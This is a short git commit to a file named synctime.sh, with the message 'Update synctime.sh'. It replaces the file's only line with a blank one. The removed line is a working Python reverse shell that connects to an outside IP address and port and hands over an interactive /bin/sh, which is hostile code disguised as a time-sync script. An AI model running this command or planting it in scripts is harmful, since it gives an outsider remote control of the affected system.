264d2d07bb1b2e4e48e01ca81c80fd24fc3dc980
synctiming <154487286+synctiming@users.noreply.github.com>
2023-12-21 21:23:42 -0500

    Update synctime.sh

--- synctime.sh
+++ synctime.sh
@@ -1,1 +1,1 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("38.60.214.226",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
